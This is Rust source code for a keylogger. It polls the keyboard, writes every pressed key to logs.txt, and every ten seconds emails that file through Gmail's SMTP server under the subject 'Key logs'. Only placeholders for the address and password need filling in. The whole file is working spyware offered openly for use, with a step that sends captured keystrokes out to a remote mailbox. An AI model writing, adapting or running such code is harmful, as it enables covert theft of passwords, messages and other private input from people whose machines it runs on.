use std::fs::{self, File};
use std::{io::{self, Write}, process::Command, thread, time::{Duration, SystemTime}};
use std::io::prelude::*;
use device_query::{DeviceQuery, DeviceState, Keycode};
use chrono::Utc;
use lettre_email::{Email, EmailBuilder};
use lettre::smtp::authentication::Credentials;
use lettre::{SmtpClient, SmtpTransport, Transport};
use std::path::Path;
use tokio::task;

#[tokio::main]
async fn main() {
    let file_name: &str = "logs.txt";
    let mut log_content = String::from("");
    let mut log_content_addon = String::from("");
    let device_state = DeviceState::new();
    let now = Utc::now();
    let date = now.to_rfc2822();
    let mut sys_time = SystemTime::now();
    let mail_sending_interval = Duration::from_secs(10);

    // Set up your email stuff here:
    let to_mail_address = "your email";
    let from_mail_address = to_mail_address;
    let from_mail_address_password = "one time password";
    
    loop {
        loop {
            let keys: Vec<Keycode> = device_state.get_keys();
            // Check if it's time to send an email
            if sys_time.elapsed().unwrap() >= mail_sending_interval {
                let email_content = date.to_string(); // Copy current logs
                let to = to_mail_address.to_string();
                let from = from_mail_address.to_string();
                let pass = from_mail_address_password.to_string();

                // Spawn a separate task for email sending
                task::spawn(async move {
                    send_mail(&to, &from, &pass, &email_content).await;
                });

                sys_time = SystemTime::now(); // Reset the timer
            }
            
            if !keys.is_empty(){
                log_content_addon = keys[0].to_string().to_lowercase();
                break;
            }
        }

        log_content = log_content.to_owned() + "-" + &log_content_addon;
        match write_to_file(file_name, &log_content) {
            Ok(_) => (),
            Err(_) => println!("couldn't write to file")
        }
        wait_for(110);
    }
}

fn write_to_file(path: &str, contents: &str) -> Result<(), Box<dyn std::error::Error>> {
    fs::write(path, contents)?;
    Ok(())
}

async fn send_mail(to_mail_address: &str, from_mail_address: &str, from_mail_address_password: &str, message: &String) {
    //creates email object
    let email = Email::builder()
    .to(to_mail_address)
    .from(from_mail_address)
    .subject("Key logs")
    .html("<h1>hush hush</h1>")
    .text(message)
    .attachment_from_file(Path::new("./logs.txt"), None, &mime::TEXT_PLAIN)
    .unwrap()
    .build()
    .unwrap();

    //creates mail credentials
    let creds = Credentials::new(
        from_mail_address.to_string(),
        from_mail_address_password.to_string(),
    );

    // Open connection to gmail
    let mut mailer = SmtpClient::new_simple("smtp.gmail.com")
        .unwrap()
        .credentials(creds.clone())
        .transport();

    // Send the email
    let result = mailer.send(email.clone().into());

    if result.is_ok() {
        println!("Email sent");
    } else {
        println!("Could not send email: {:?}", result);
    }

    assert!(result.is_ok());
}

fn wait_for(millis: u64) {
    io::stdout().flush().unwrap();
    thread::sleep(Duration::from_millis(millis));
}
